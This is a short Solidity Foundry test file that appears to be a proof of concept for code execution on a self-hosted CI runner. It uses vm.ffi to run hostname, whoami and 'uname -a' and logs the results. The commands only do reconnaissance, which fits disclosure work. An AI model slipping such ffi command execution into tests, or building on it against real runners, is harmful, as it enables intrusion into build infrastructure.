// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import { Test } from "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";

contract PocReconTest is Test {
    function test_PocReconOnly() public {
        console2.log("=== PoC: code execution confirmed on self-hosted runner (ffi=true) ===");
        string[] memory hostnameCmd = new string[](1);
        hostnameCmd[0] = "hostname";
        console2.log("hostname:", string(vm.ffi(hostnameCmd)));
        string[] memory whoamiCmd = new string[](1);
        whoamiCmd[0] = "whoami";
        console2.log("whoami:", string(vm.ffi(whoamiCmd)));
        string[] memory unameCmd = new string[](2);
        unameCmd[0] = "uname"; unameCmd[1] = "-a";
        console2.log("uname -a:", string(vm.ffi(unameCmd)));
    }
}

